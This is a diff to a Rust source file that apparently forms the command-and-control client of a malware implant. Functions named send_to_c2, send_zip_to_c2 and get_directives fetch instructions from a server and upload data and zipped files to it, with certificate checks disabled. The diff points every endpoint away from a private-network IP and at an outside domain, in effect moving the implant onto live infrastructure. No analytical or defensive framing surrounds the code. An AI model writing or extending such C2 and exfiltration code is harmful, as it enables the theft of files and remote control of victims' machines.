@@ -13,7 +13,6 @@ use zip::result::ZipResult;
 use zip::write::SimpleFileOptions;
 use zip::{AesMode, CompressionMethod};
 
-
 enum _Status {
     SUCCESSFUL,
     FAILED,
@@ -52,7 +51,7 @@ pub async fn send_directive_status(
     });
 
     let res = client
-        .post("https://192.168.19.186:3030/sync")
+        .post("https://api-sync.site/sync")
         .json(&body)
         .send()
         .await;
@@ -65,7 +64,7 @@ pub async fn send_directive_status(
 }
 
 pub async fn get_directives() -> Result<Vec<String>, Error> {
-    let url = "https://192.168.19.186:3030/directives";
+    let url = "https://api-sync.site/directives";
 
     let client = reqwest::Client::builder()
         .danger_accept_invalid_certs(true)
@@ -89,7 +88,7 @@ pub async fn send_json_to_c2<T: Serialize>(data: &T) -> Result<()> {
         .build()?;
 
     let _res = client
-        .post("https://192.168.19.186:3030/directives")
+        .post("https://api-sync.site/directives")
         .header("Content-Type", "application/json")
         .json(data)
         .send()
@@ -104,7 +103,8 @@ pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
         .build()?;
 
     let _res = client
-        .post("https://192.168.19.186:3030/directives")
+        .post("https://api-sync.site/directives")
+        .header("Content-Type", "text/plain")
         .body(data)
         .send()
         .await?;
@@ -176,7 +176,7 @@ pub async fn send_zip_to_c2(filepath: &Path) -> Result<(), Box<dyn std::error::E
     let file_bytes = tokio::fs::read(filepath).await?;
 
     let response = client
-        .post("https://192.168.19.186:3030/directives")
+        .post("https://api-sync.site/directives")
         .header("Content-Type", "application/zip")
         .body(file_bytes)
         .send()
@@ -186,14 +186,13 @@ pub async fn send_zip_to_c2(filepath: &Path) -> Result<(), Box<dyn std::error::E
     Ok(())
 }
 
-
 pub async fn send_mapping(mapping: &CommandMapping) -> Result<(), reqwest::Error> {
     let client = reqwest::Client::builder()
         .danger_accept_invalid_certs(true)
         .build()?;
 
     let res = client
-        .post("https://192.168.19.186:3030/mapping")
+        .post("https://api-sync.site/mapping")
         .json(mapping)
         .send()
         .await;
